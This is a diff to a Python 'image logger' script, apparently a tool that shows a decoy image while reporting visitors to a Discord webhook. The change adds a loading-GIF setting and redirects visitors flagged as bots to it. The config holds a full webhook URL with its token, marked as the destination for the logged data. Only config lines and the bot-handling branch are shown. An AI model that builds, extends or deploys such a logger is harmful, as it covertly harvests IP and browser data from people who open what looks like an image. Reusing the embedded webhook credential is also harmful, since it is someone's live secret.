@@ -8,6 +8,7 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1551237867177639936/e4xhi_uNNW1FApzw2wr8II5NZM8gSRikeFmjpQBHug0IKszxn3RbF2zgRI05r0zcgHWD", # Your webhook link
     "image": "https://i.pinimg.com/736x/6f/e7/42/6fe742469cc9d01a6614f06f1777c415.jpg", # The image you want the site to load
+    "loadingImage": "https://static2.klipy.com/ii/d7aec6f6f171607374b2065c836f92f4/81/5b/ohlqDdgJ.gif",
     "imageArgument": True,
 
     
@@ -298,7 +299,7 @@ body {{
             
             if botCheck(ip, user_agent):
                 self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else config["loadingImage"])
                 self.end_headers()
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"])
